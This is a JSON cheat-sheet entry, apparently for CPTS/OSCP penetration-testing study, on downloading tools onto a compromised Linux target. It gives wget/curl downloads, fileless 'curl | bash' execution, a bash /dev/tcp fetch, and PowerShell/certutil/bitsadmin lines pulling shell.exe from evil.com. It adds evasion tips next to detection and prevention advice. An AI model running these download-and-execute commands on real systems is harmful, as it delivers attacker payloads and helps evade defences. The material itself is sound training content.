@@ -1,0 +1,101 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "wget",
+    "curl",
+    "bash"
+  ],
+  "tags": [
+    "linux",
+    "download",
+    "fileless"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Linux Transfer",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Download served file by IP:port",
+      "command": "wget 192.168.49.128:8000/filetotransfer.txt"
+    }
+  ],
+  "notes": "Pull tools onto a Linux target with wget/curl from your http.server; when neither exists use bash /dev/tcp or the scripting one-liners. Always verify with md5sum - the transfer is worthless if the binary is corrupted.",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "nix-scp",
+      "rel": "alternative",
+      "note": "SCP over SSH if you have creds."
+    },
+    {
+      "id": "http-file-servers",
+      "rel": "prereq",
+      "note": "Host the file first."
+    },
+    {
+      "id": "linux-cred-hunt",
+      "rel": "next",
+      "note": "Run the enum/loot tools you pulled."
+    }
+  ],
+  "id": "nix-download",
+  "name": "Linux - Download (wget/curl/dev-tcp)",
+  "command": "wget <url> -O /tmp/out.sh",
+  "description": "Pull files on Linux with wget or curl, execute fileless by piping to an interpreter, or - when neither is present - use bash's built-in /dev/tcp.",
+  "variations": [
+    {
+      "label": "wget / curl to disk",
+      "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\ncurl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
+    },
+    {
+      "label": "Fileless (pipe to interpreter)",
+      "command": "curl https://<ip>/LinEnum.sh | bash\nwget -qO- https://<ip>/helloworld.py | python3"
+    },
+    {
+      "label": "bash /dev/tcp (no wget/curl)",
+      "command": "exec 3<>/dev/tcp/<lhost>/80\necho -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\">&3\ncat <&3"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Native Linux tools (wget, curl, and fallbacks like /dev/tcp, python urllib) download a file from an attacker HTTP(S) server - ubiquitous and usually available.",
+    "prerequisites": "Code execution on a Linux target with a download tool (or bash /dev/tcp) and egress to the attacker host.",
+    "impact": "Attacker tooling (enum scripts, exploits) delivered to the target for the next stage.",
+    "detection": "Outbound HTTP(S) from wget/curl/python to an external host; the command line (auditd/execve) and the new file on disk; default wget/curl User-Agents in web/proxy logs.",
+    "artifacts": "The downloaded file; wget/curl/python in process/auditd logs; an outbound connection to the attacker; tool default UA.",
+    "prevention": "[MITRE T1105 M1037 Filter Network Traffic] Use web content filtering to block risky file types (.exe) and whitelist domains (the module scenario shows GitHub/Dropbox/Drive blocked); [M1031 Network Intrusion Prevention] inspect and block transfers at IDS/IPS. Apply application control (WDAC/AppLocker) to block download cradles/LOLBins, and AV/EDR to catch known tooling.",
+    "evasion": "Pipe directly into an interpreter (curl ... | bash) to avoid a disk artifact; set a browser UA (curl -A / wget -U); use HTTPS and an allowed domain.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
